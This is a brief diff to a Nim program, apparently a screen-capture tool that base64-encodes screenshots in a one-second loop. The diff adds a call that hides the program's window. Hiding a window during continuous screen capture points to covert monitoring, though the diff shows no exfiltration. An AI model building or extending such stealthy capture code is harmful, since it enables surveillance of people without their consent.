@@ -1,6 +1,7 @@
 import asyncdispatch
 
 import lib/functions/getWindowName
+import lib/functions/hideWindow
 import lib/functions/screenshot
 
 let base64Ss: string = screenshot()
@@ -12,7 +13,8 @@ proc main() {.async.} =
   await sleepAsync(1000)
   asyncCheck main()
 
+hideWindow()
+
 asyncCheck main()
 
 runForever()
-
